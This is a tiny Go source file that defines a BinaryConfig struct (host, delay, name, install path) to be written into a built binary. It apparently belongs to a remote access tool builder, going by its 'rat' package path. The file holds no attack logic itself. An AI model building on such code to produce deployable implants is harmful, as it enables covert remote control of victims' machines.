package common

import (
	"rat/common/installpath"
)

// BinaryConfig is written to the built binary
type BinaryConfig struct {
	Host    string           `json:"host"`
	Delay   int              `json:"delay"`
	Name    string           `json:"name"`
	Install installpath.Path `json:"install"`
}
